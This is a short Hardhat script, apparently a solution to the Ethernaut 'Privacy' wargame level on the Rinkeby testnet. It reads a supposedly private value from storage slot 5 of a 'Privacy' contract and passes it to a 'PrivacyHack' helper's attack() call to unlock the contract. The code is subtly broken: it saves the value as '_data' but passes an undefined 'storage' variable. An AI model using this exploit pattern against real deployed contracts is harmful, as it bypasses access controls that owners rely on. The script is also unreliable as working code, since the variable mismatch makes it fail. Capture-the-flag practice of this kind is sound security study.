import { ethers } from "hardhat";

async function main(){

    // my rinkeby address
    let player = "0x87955711F08521Eb054f9354371eC38713f236ee";

    // Privacy contract address
    let address_a = "0x13d549CB5431961Bb5f2F8a502ecF754e9CEC562";

    // PrivacyHack address;
    let address_b = "0x0A4bd90A75f1B881ba75934362c8ae999bD9F05B";

    let signer = await ethers.getSigner(player);
    let contract_a = await ethers.getContractAt("Privacy", address_a, signer);
    let contract_b = await ethers.getContractAt("PrivacyHack", address_b, signer);

    // data we are interested in is in slot 5 of Privacy contract storage
    let _data = await ethers.provider.getStorageAt(address_a,5);
    await contract_b.attack(storage);

    // check lock is unlocked
    console.log(await contract_a.locked());

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
